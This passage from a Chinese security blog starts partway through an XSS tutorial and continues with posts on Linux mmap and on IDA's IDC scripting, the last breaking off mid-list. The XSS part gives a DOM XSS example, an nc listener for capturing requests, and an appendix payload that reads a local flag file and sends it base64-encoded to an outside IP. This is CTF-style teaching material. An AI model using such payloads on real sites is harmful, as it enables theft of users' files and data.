<p>（1）添加正常的留言，使用Firebug快速寻找显示标签</p>
<p>（2）判断内容输出（显示）的地方是在标签内还是在标签属性内，或者在其他地方。如果显示区域不在HTML属性内，则可以直接使用xss代码注入。如果在属性内，需要先闭合标签再写入xss代码。如果不能得知内容输出的具体位置，则可以使用模糊测试方案。</p>
<p>（3）在插入xss payload代码后，重新加载留言页面，xss代码被浏览器执行。</p>
<h4 id="2-3-DOM-XSS"><a href="#2-3-DOM-XSS" class="headerlink" title="2.3 DOM XSS"></a>2.3 DOM XSS</h4><p>DOM的全称为Document Object Model，即文档对象模型。</p>
<p>基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。简单理解DOM XSS就是出现在javascript代码中的xss漏洞。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;  </div><div class="line"><span class="keyword">var</span> temp = document.URL;<span class="comment">//获取URL  </span></div><div class="line"><span class="keyword">var</span> index = document.URL.indexOf(<span class="string">"content="</span>)+<span class="number">4</span>;  </div><div class="line"><span class="keyword">var</span> par = temp.substring(index);  </div><div class="line">document.write(decodeURI(par));<span class="comment">//输入获取内容  </span></div><div class="line">&lt;/script&gt;  </div><div class="line"></div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
<p>这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。</p>
<p>反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p>
<h3 id="3、利用工具"><a href="#3、利用工具" class="headerlink" title="3、利用工具"></a>3、利用工具</h3><h4 id="3-1-xss接收工具"><a href="#3-1-xss接收工具" class="headerlink" title="3.1 xss接收工具"></a>3.1 xss接收工具</h4><p>谈到xss的利用工具，这里不得不提到火日大神，其在github上的工具<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
<p>这个工具是ctf中xss应用的经典工具</p>
<p><strong>另外一个工具就是nc</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nc -l -p 8080</span></div><div class="line">GET /1.jpg HTTP/1.1</div><div class="line">Host: 10.254.20.127:8080</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh,zh-CN;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
<p>当外界请求<a href="http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。" target="_blank" rel="external">http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。</a></p>
<h4 id="3-2-xss检测工具"><a href="#3-2-xss检测工具" class="headerlink" title="3.2 xss检测工具"></a>3.2 xss检测工具</h4><p>xss检测工具很多，现在xsser、xssf</p>
<p>说真的，两个检测工具不怎么好用，还不如手工呢！</p>
<p>另外就是xssor，可以访问</p>
<p><a href="https://github.com/evilcos/xssor2" target="_blank" rel="external">https://github.com/evilcos/xssor2</a></p>
<p><a href="http://xssor.io/" target="_blank" rel="external">http://xssor.io/</a></p>
<h3 id="4、附录"><a href="#4、附录" class="headerlink" title="4、附录"></a>4、附录</h3><p>xss一般请求方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evilcode=&lt;script&gt;&lt;img src=&quot;http://xxxx/xss.jpg&quot;/&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evalcode=&lt;script&gt;var xmlhttp= new XMLHttpRequest();xmlhttp.open(&quot;GET&quot;,&quot;file:///var/www/html/flag.php&quot;,true);xmlhttp.onload = function () &#123;content = btoa(xmlhttp.responseText);window.location.href=&quot;http://118.190.78.155:8080/index.php?a=&quot;%2bcontent;&#125;;xmlhttp.send(null);&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>btoa(&quot;str&quot;)   ===&gt;  base64加密字符串</p>
<p>atob(&quot;ABSCRF==&quot;)    ===&gt;  base64解密字符串</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/19/Linux内存映射函数mmap函数详解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/19/Linux内存映射函数mmap函数详解/" itemprop="url">Linux内存映射函数mmap函数详解</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-19T15:48:19+08:00">
                2017-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>mmap将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。</p>
<h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><blockquote>
<p>void<em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset);</p>
<p>int munmap(void* start,size_t length);</p>
</blockquote>
<p>mmap 必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>下面说一下内存映射的步骤:</p>
<ol>
<li>用open系统调用打开文件, 并返回描述符fd.</li>
<li>用mmap建立内存映射, 并返回映射首地址指针start.</li>
<li>对映射(文件)进行各种操作, 显示(printf), 修改(sprintf)</li>
<li>用munmap(void *start, size_t length)关闭内存映射.</li>
<li>用close系统调用关闭文件fd.</li>
</ol>
<h3 id="mmap函数的主要用途"><a href="#mmap函数的主要用途" class="headerlink" title="mmap函数的主要用途"></a>mmap函数的主要用途</h3><p>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；</p>
<p>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</p>
<p>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</p>
<h3 id="mmap函数说明"><a href="#mmap函数说明" class="headerlink" title="mmap函数说明"></a>mmap函数说明</h3><p><strong>参数start</strong></p>
<p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
<p><strong>参数length</strong></p>
<p>代表将文件中多大的部分映射到内存。</p>
<p><strong>参数prot</strong></p>
<p>映射区域的保护方式。可以为以下几种方式的组合：</p>
<p>PROT_EXEC 映射区域可被执行</p>
<p>PROT_READ 映射区域可被读取</p>
<p>PROT_WRITE 映射区域可被写入</p>
<p>PROT_NONE 映射区域不能存取</p>
<p><strong>参数flags</strong></p>
<p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p>
<p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此标志。</p>
<p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p>
<p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p>
<p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p>
<p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p>
<p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p>
<p><strong>参数fd</strong></p>
<p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p>
<p><strong>参数offset</strong></p>
<p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</p>
<p><strong>返回值</strong></p>
<p>若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。</p>
<p><strong>错误代码</strong></p>
<p>EBADF  参数fd不是有效的文件描述词</p>
<p>EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用</p>
<p>MAP_SHARED则要有PROT_WRITE以及该文件要能写入。</p>
<p>EINVAL 参数start、length 或offset有一个不合法。</p>
<p>EAGAIN 文件被锁住，或是有太多内存被锁住。</p>
<p>ENOMEM 内存不足。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/IDA的调试脚本idc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/18/IDA的调试脚本idc/" itemprop="url">IDA的调试脚本idc</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T21:30:24+08:00">
                2017-09-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全工具/" itemprop="url" rel="index">
                    <span itemprop="name">安全工具</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>IDA的脚本有两种，一种是idc，另一种是IDAPython。</p>
<p>可以通过File-&gt;Script file；File-&gt;Script command访问IDA的脚本引擎。</p>
<h2 id="1、IDC语言"><a href="#1、IDC语言" class="headerlink" title="1、IDC语言"></a>1、IDC语言</h2><h3 id="1-1-IDC变量"><a href="#1-1-IDC变量" class="headerlink" title="1.1 IDC变量"></a>1.1 IDC变量</h3><p>IDC的3种数据类型：整数（IDA文档使用类型名称long）、字符串和浮点值。当然也包括对象、引用和函数指针</p>
<h4 id="1-1-1-局部变量声明"><a href="#1-1-1-局部变量声明" class="headerlink" title="1.1.1 局部变量声明"></a>1.1.1 局部变量声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">auto addr, reg, val;	//legal, multiple variables declared with no initializers</div><div class="line">auto count = 0;			// declaration with initialization</div></pre></td></tr></table></figure>
<p>IDC认可使用/**/的C风格多行注释，//的行注释</p>
<h4 id="1-1-2-全局变量声明"><a href="#1-1-2-全局变量声明" class="headerlink" title="1.1.2 全局变量声明"></a>1.1.2 全局变量声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">extern outsideGlobal;</div><div class="line">static main()&#123;</div><div class="line">	extern insideGlobal;</div><div class="line">	outsideGlobal = &quot;Global&quot;;</div><div class="line">	insideGlobal = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以在函数内部或外部声明全部变量，但不能子啊声明变量的时候提供初始值。</p>
<h3 id="1-2-IDC表达式"><a href="#1-2-IDC表达式" class="headerlink" title="1.2 IDC表达式"></a>1.2 IDC表达式</h3><p>除了少数几个特例外，IDC几乎支持C的所有算数和逻辑运算符，包括三元运算(?:)，但是不支持op=（+=、*=、&gt;&gt;=等）形式的符合赋值运算符。</p>
<p>IDC的字符串运算与C的有所不同。在IDC中，支持类python的字符串复制、拼接、分片操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto str=&quot;String to slice&quot;;</div><div class="line">auto s1,s2,s3,s4;</div><div class="line">s1 = str[7:9];</div></pre></td></tr></table></figure>
<p>需要注意的是IDC没有数组数据类型。</p>
<h3 id="1-3-IDC语句"><a href="#1-3-IDC语句" class="headerlink" title="1.3 IDC语句"></a>1.3 IDC语句</h3><p>IDC的语句以很好结束。switch语句是IDC唯一不支持的C风格复合语句。在使用for循环的时候，需要记住的是，IDC不支持复合赋值运算符op=。</p>
<p>并且IDC引入了try/catch块和相关的switch语句，在语法上它们类似C++一场处理。</p>
<p>IDC的块中，可以声明新的变量，只要变量声明位于花括号内的第一个语句即可。但是IDC并不严格限制新引入的变量的作用范围，因此，你可以在声明这些变量的花括号以外引用它们。</p>
<h3 id="1-4-IDC函数"><a href="#1-4-IDC函数" class="headerlink" title="1.4 IDC函数"></a>1.4 IDC函数</h3><p>IDC仅仅在独立程序(.idc文件)中支持用户定义的函数。iDC命令对话框不支持用户定义的函数。IDC用于声明用户定义的函数的语法与C语言的差异甚大。在IDC中，static关键字用于引入一个用户定义的函数，函数的参数列表仅包含一个以逗号分隔的参数名列表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">static my_func(x, y, z)&#123;</div><div class="line">  auto a,b,c;</div><div class="line">  ......  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并且参数可以采用传值或者传参的方式。</p>
<p>现在已经可以将函数引用作为一个参数传递给另一个函数，并将函数引用作为函数的返回结果。下面的代码清单说明了使用函数参数和函数作为返回值的情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static getFunc()&#123;</div><div class="line">  return Message; //return the built-in Message function as a result</div><div class="line">&#125;</div><div class="line">static useFunc(func, arg)&#123;</div><div class="line">  func(arg);  // func here is expected to be a function reference</div><div class="line">&#125;</div><div class="line">static main()&#123;</div><div class="line">  auto f = getFunc();  </div><div class="line">  f(&quot;Hello world!\n&quot;);  // invoke the returned function f</div><div class="line">  useFunc(f, &quot;XXS&quot;);	// no need for &amp; operator, functions always call-by-reference</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="1-5-IDC对象"><a href="#1-5-IDC对象" class="headerlink" title="1.5 IDC对象"></a>1.5 IDC对象</h3><p>IDC定义了一个成为object的根类，最终所有类都是由它衍生而来，并且在创建新类时支持单一继承。IDC并不使用访问说明符，如public或private，所有类成员均为有效公共类。类声明仅包含类成员函数的定义。要在类中创建数据成员，只需要创建一个给数据成员赋值的赋值语句即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class ExampleClass&#123;</div><div class="line">  ExampleClass(x,y)&#123; // constructor</div><div class="line">    this.a = x;	// all ExampleClass objects hava data member a</div><div class="line">    this.b = y;	// all ExampleClass objects hava data member b</div><div class="line">  &#125;</div><div class="line">  ~ExampleClass()&#123;  // destructor</div><div class="line">  &#125;</div><div class="line">  foo(x)&#123;</div><div class="line">    this.a = this.a + x;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">staic main()&#123;</div><div class="line">  /* ExampleClass ex;*/ // this is not a valid variable declaration</div><div class="line">  auto ex = ExampleClass(1,2);	// this is right</div><div class="line">  ex.foo(10);</div><div class="line">  ex.z = &quot;string&quot;;	// object ex now has a member z, BUT class does not</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="1-6-IDC程序"><a href="#1-6-IDC程序" class="headerlink" title="1.6 IDC程序"></a>1.6 IDC程序</h3><p>需要有主函数，并且主程序文件还必须包含idc.idc文件以获得它包含的有用宏定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#include &lt;idc.idc&gt;	// useful include directive</div><div class="line">static main()&#123;</div><div class="line">  // do something</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>IDC认可的预处理指令</p>
<ul>
<li>#include &lt;文件&gt;</li>
<li>#define&lt;宏名称&gt;[可选值]      创建一个宏，可以选择给它分配指定的值。IDC预定义了许多宏来测试脚本执行环境，如\<em>NT\</em>、\<em>LINUX\</em>、\<em>MAC\</em>、\<em>GUI\</em>、\<em>TXT\</em></li>
<li>#ifdef&lt;名称&gt;  测试指定的宏是否存在，如果存在，可以选择处理其后的任何语句</li>
<li>#else  与上面的#ifdef配合使用</li>
<li>#endif</li>
<li>#undef&lt;名称&gt;  删除指定宏</li>
</ul>
<h3 id="1-7-IDC错误处理"><a href="#1-7-IDC错误处理" class="headerlink" title="1.7 IDC错误处理"></a>1.7 IDC错误处理</h3><p>运行IDC脚本时，可能遇到两种错误：解析错误、运行时错误。</p>
<p>解析错误指的是令程序无法运行的错误，包括语法错误、引用未定义变量、函数参数数量错误等。</p>
<p>运行时错误会使一段脚本立即终止运行。当然，当一个脚本运行时间过长，也会发生运行时错误。</p>
<p>调试IDC脚本很麻烦，除了大量使用输出语句外，没有其他办法调试IDC脚本。</p>
<h3 id="1-8-IDC永久数据存储"><a href="#1-8-IDC永久数据存储" class="headerlink" title="1.8 IDC永久数据存储"></a>1.8 IDC永久数据存储</h3><p>前面提到IDC没有传统意义上的数据，即声明一个大型存储块，然后使用下标访问块中的数据项的数组。但是IDC确实有全局永久数组，这可以看成已命名的永久对象，而且这些对象是稀疏数组。数组中的同时保存一个整数值和一个字符串值，IDC的全局数组无法存储浮点值。</p>
<ul>
<li>long CreateArray(string name)   返回数组句柄</li>
<li>long GetArrayId(string name)  返回索引句柄</li>
<li>long SetArrayLong(long id, long idx, long value)  将整数value存储到数组id中idx位置</li>
<li>long SetArrayString(long id, long idx, string str)</li>
<li>string or long GetArrayElement(long tag, long id, long idx)  提取的是整数还是字符串，有tag参数的值决定，必须是常量AR_LONG（整数）或AR_STR（字符串）</li>
<li>long DelArrayElement(long tag, long id, long idx)</li>
<li>void DeleteArray(long id) 删除句柄id对应的数组</li>
<li>long RenameArray(long id, string newname)</li>
</ul>
<h2 id="2、IDC的常用函数"><a href="#2、IDC的常用函数" class="headerlink" title="2、IDC的常用函数"></a>2、IDC的常用函数</h2><h3 id="2-1-读取和修改数据的函数"><a href="#2-1-读取和修改数据的函数" class="headerlink" title="2.1 读取和修改数据的函数"></a>2.1 读取和修改数据的函数</h3><ul>
<li>long Byte(long addr)      从虚拟地址addr中读取一个字节值</li>
<li>long Word(long addr)      从虚拟地址addr中读取一个字（2字节）值</li>
<li>long Dword(long addr)      从虚拟地址addr中读取一个双字（4字节）值</li>
<li>void PatchByte(long addr, long val)   设置虚拟地址addr处的一个字节值</li>
<li>void PatchWord(long addr, long val)   设置虚拟地址addr处的一个字值</li>
<li>void PatchDword(long addr, long val)   设置虚拟地址addr处的一个双字值</li>
<li>bool isLoaded(long addr)   如果addr包含有效数据，则返回1，否则0</li>
</ul>
<p>需要注意的是，我们在做这种操作的时候应该考虑字节顺序。</p>
<h3 id="2-2-用户交互函数"><a href="#2-2-用户交互函数" class="headerlink" title="2.2 用户交互函数"></a>2.2 用户交互函数</h3><ul>
<li>void Message(string format, ...)   格式化打印。接受printf风格的格式化字符串</li>
<li>void print(...)   在输出窗口打印每个参数的字符串表示形式</li>
<li>void Wording(string format, ...)   对话框中显示一条格式化信息</li>
<li>string AskStr(string default, string prompt)  显示一个输入框，要求用户输入一个额字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0</li>
<li>string AskFile(long doSave, string mask, string prompt)  显示一个文件选择对话框，以简化选择文件的任务。新文件保存数据(doSave=1)，或选择现有的文件读取数据(doSave=0)。可以根据mask（如*.*或*.idc）过滤显示的文件列表。如果操作成功，则会返回选定文件的名称；如果对话框被取消，返回0</li>
<li>string AskYN(long default, string prompt)  用是或否的问题提示用户。突出一个默认的答案（1为是，0为否，-1为取消）。返回值是一个选定答案的整数。</li>
<li>long ScreenEA()   返回当前光标所在位置的虚拟地址</li>
<li>bool Jump(long addr)  跳转到反汇编窗口的指定地址</li>
</ul>
<h3 id="2-3-字符串操纵函数"><a href="#2-3-字符串操纵函数" class="headerlink" title="2.3 字符串操纵函数"></a>2.3 字符串操纵函数</h3><ul>
<li>string form(string format, ...)   //preIDA5.6  类似c语言的sprintf函数，返回一个新年字符串，该字符串根据所提供的格式化字符串和值进行格式化</li>
<li>string sprintf(string format, ...)  //IDA5.6+  sprintf用于替代form</li>
<li>long atol(string val)   将十进制值val转化成对应的整数值</li>
<li>long xtol(string val)  将十六进制值val（可选择以0x开头）转换成对应的整数值</li>
<li>string ltoa(long val, long radix)  以指定的radix(2、8、10或16)返回val的字符串值</li>
<li>string ord(string ch)  返回单字符字符串ch的ASCII值</li>
<li>long strlen(string str)  返回所提供字符串的长度</li>
<li>long strstr(string str, string substr)  返回str中substr的索引，如果没有发现子字符串，则返回-1</li>
<li>string substr(string str, long start, long end)  返回包含str中由start到end-1位置的字符的子字符串。如果使用分片，此字符串等同于str[start:end]</li>
</ul>
<h3 id="2-4-文件输入-输出函数"><a href="#2-4-文件输入-输出函数" class="headerlink" title="2.4 文件输入/输出函数"></a>2.4 文件输入/输出函数</h3><ul>
<li>long fopen(string filename, string mode)  返回一个整数文件句柄（如果发生错误，则返回0），供所有IDC文件 输入/输出函数使用。mode参数与C语言的fopen函数使用相同的模式(r,w,等)</li>
<li>void fclose(long handle)  关闭fopen中文件句柄指定的文件</li>
<li>void filelength(long handle)  返回指定文件的长度，如果发生错误，则返回-1</li>
<li>long fgetc(long handle)  从给定文件中读取一个字节。如果发生错误，则返回-1</li>
<li>long fputc(long val, long handle)  写入一个字节到指定文件中，如果操作成功，则返回0；如果发生错误，则返回-1</li>
<li>long fprintf(long handle, string format, ...)  将格式化字符串写入到指定文件中</li>
<li>long writestr(long handle, string str)  将指定的字符串写入到给定文件中</li>
<li>string/long readstr(long handle)  从给定文件中读取一个字符串。这个函数读取到下一个换行符位置的所有字符（包括非ASCII字符），包括换行符本身（ASCII 0x0a）。操作成功，返回字符串；如果读到文件结尾，则返回-1</li>
<li>long writelong(long handle, long val, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个4字节整数写入到指定文件</li>
<li>long readlong(long handle, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个4字节整数</li>
<li>long writeshort(long handle, long val, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个2字节整数写入到指定文件</li>
<li>long readshort(long handle, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个2字节整数</li>
<li>bool loadfile(long handle, long pos, long addr, long length)  从给定文件的pos位置读取length数量的字节，并将这些字节写入到以addr地址开头的数据库中</li>
<li>bool savefile(long handle, long pos, long addr, long length)  将以addr数据库地址开头的length数量的字节写入到给定文件的pos位置</li>
</ul>
<h3 id="2-5-操纵数据库名称"><a href="#2-5-操纵数据库名称" class="headerlink" title="2.5 操纵数据库名称"></a>2.5 操纵数据库名称</h3><ul>
<li>string Name(long addr)  返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，这个函数并不敢回用户定义的名称</li>
<li>string NameEx(long from, long addr)  返回与addr有关的名称。如果该位置没有名称，则返回空字符串。如果from是一个同样包含addr的函数中的地址，则这个函数返回用户定义的局部名称。</li>
<li>bool MakeNameEx(long addr, string name, long flags)  将给定的名称分配给给定的地址。改名称使用flags位掩码中指定的属性创建而成。这些标志在帮助系统中的MakeNameEx文档中记载描述，可以用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出。</li>
<li>long LockByName(string name)  返回一个位置（名称已给定）的地址。如果数据库中没有该名称，则返回BADADDR(-1)</li>
<li>long LockByNameEx(long funcaddr, string localname)  在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回BADADDR（-1）</li>
</ul>
<h3 id="2-6-处理函数的函数"><a href="#2-6-处理函数的函数" class="headerlink" title="2.6 处理函数的函数"></a>2.6 处理函数的函数</h3><ul>
<li>long GetFunctionAttr(long addr, long attrib)  返回包含给定地址的函数的被请求的属性。文档中有属性常量。如要查找一个函数的结束地址，可以使用GetFunctionAttr(addr, FUNCTION_END)</li>
<li>string GetFunctionName(long addr)  返回包含给定地址的函数的名称。如果给定地址并不属于一个函数，则返回一个空字符串</li>
<li>long NextFunction(long addr)  返回给定地址后的下一个函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</li>
<li>long PrevFunction(long addr)  返回给定地址之前距离最近的函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</li>
</ul>
<p>当然，也可以通过函数名，使用LockByName函数查找函数的起始地址</p>
<h3 id="2-7-代码交叉引用函数"><a href="#2-7-代码交叉引用函数" class="headerlink" title="2.7 代码交叉引用函数"></a>2.7 代码交叉引用函数</h3><ul>
<li>long Rfirst(long from)  返回给定地址向其转交控制权的第一个位置。如果给定地址没有引用其他地址，则返回BADAADDR（-1）</li>
<li>long Rnext(long from, long current)  如果current已经在前一次调用Rfirst或Rnext时返回，则返回给定地址(from)转交控制权的下一个位置。如果没有其他交叉引用存在，则返回BADADDR</li>
<li>long XrefType()  返回一个常量，说明某个交叉引用查询函数（如Rfirst）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括fl_CN（近调用）、fl_CF（远调用）、fl_JN（近跳转）、fl_JF（远跳转）和fl_F（普通顺序流）</li>
<li>long RfirstB(long to)  返回转交控制权到给定地址的第一个位置。如果不存在对给定地址的交叉引用，则返回BADADDR（-1）</li>
<li>long RnextB(long to, long current)  如果current已经在前一次调用RfirstB或RnextB时返回，则返回下一个转交控制权给给定地址(to)的位置。如果不存在其他堆给定位置的交叉引用，则返回BADADDR（-1）</li>
</ul>
<p>每次调用一个交叉引用函数，IDA都会设置一个内部IDC状态变量，指出返回的最后一个交叉引用的类型。如果需要知道你收到的交叉引用的类型，那么在调用其他交叉引用查询函数之前，必须调用XrefType函数</p>
<h3 id="2-8-数据交叉引用函数"><a href="#2-8-数据交叉引用函数" class="headerlink" title="2.8 数据交叉引用函数"></a>2.8 数据交叉引用函数</h3><ul>
<li>long Dfirst(long from)  返回给定地址引用一个数据值得第一个位置。如果给定地址没有引用其他地址，则返回BADADDR</li>
<li>long Dnext(long from, long current)   如果current已经在前一次调用Dfirst或Dnext时返回，则返回给定地址(from)向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，则返回BADADDR</li>
